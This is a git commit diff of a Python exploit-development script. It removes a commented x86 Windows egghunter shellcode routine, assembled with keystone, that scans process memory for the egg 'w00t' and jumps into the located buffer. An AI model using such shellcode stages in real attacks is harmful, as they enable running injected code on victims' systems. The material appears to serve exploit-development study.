8ebe43ef885ca6982f82247f186b58e4426ae998
Cola <63403598+cola8888@users.noreply.github.com>
2023-11-23 14:05:05 +0800

    Update and rename reboot.py to Reboot.py

--- Reboot.py
+++ Reboot.py
@@ -1,58 +1,7 @@
 import ctypes, struct
 from keystone import *
 
-CODE = (
-    # We use the edx register as a memory page counter
-    "							 "
-    "	loop_inc_page:			 "
-    # Go to the last address in the memory page
-    "		or dx, 0x0fff		;"
-    "	loop_inc_one:			 "
-    # Increase the memory counter by one
-    "		inc edx				;"
-    "	loop_check:				 "
-    # Save the edx register which holds our memory 
-    # address on the stack
-    "		push edx			;"
-    # Push the system call number 
-    "		mov eax, 0xfffffe3a 			;"
-    "		neg eax				;"
-    # Perform the system call 发起调用
-    "		int 0x2e			;"
-    # Check for access violation, 0xc0000005 
-    # (ACCESS_VIOLATION)
-    "		cmp al,05			;"
-    # Restore the edx register to check later 
-    # for our egg
-    "		pop edx				;"
-    "	loop_check_valid:		 "
-    # If access violation encountered, go to n
-    # ext page
-    "		je loop_inc_page	;"
-    "	is_egg:					 "
-    # Load egg (w00t in this example) into 
-    # the eax register
-    "		mov eax, 0x74303077	;"
-    # Initializes pointer with current checked 
-    # address 
-    "		mov edi, edx		;"
-    # Compare eax with doubleword at edi and 
-    # set status flags
-    "		scasd				;"
-    # No match, we will increase our memory 
-    # counter by one
-    "		jnz loop_inc_one	;"
-    # First part of the egg detected, check for 
-    # the second part
-    "		scasd				;"
-    # No match, we found just a location 
-    # with half an egg
-    "		jnz loop_inc_one	;"
-    "	matched:				 "
-    # The edi register points to the first 
-    # byte of our buffer, we can jump to it
-    "		jmp edi				;"
-)
+
 
 CODE2 = '''
     start:
